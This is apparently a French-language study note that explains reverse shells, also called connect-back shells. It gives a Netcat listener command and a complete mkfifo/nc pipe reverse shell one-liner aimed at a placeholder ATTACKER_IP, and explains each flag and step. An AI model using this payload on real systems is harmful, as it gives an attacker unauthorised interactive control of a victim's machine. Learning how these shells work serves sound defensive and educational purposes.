Qu’est-ce qu’un Reverse Shell ?

Aussi appelé connect back shell.

Technique très répandue en cyberattaque pour obtenir l’accès à une machine.

Principe : la victime se connecte à l’attaquant → cela permet de contourner certains pare-feu ou filtres réseau.

Attaquant prépare un listener (ex. avec Netcat) :
```bash
nc -lvnp 443
```
 - `-l` : écoute
        
- `-v` : mode verbeux
- `-n` : pas de résolution DNS (IP uniquement)
- `-p` : port utilisé (souvent un port commun comme 80, 443, 8080 pour se fondre dans le trafic légitime)     
- **Exécution du payload sur la machine cible**  
    Exemple de payload (pipe reverse shell) :
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
- `rm -f /tmp/f` : supprime d’éventuels pipes existants
- `mkfifo /tmp/f` : crée un **pipe nommé** (communication bidirectionnelle)
- `cat /tmp/f` : lit les entrées du pipe
- `| sh -i 2>&1` : lance un shell interactif (avec redirection des erreurs)
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` : envoie la sortie au Netcat de l’attaquant
- `>/tmp/f` : renvoie la sortie dans le pipe pour maintenir la communication

**Connexion établie**
- L’attaquant reçoit un terminal interactif depuis la victime.
- Il peut exécuter des commandes comme s’il était connecté directement à la machine.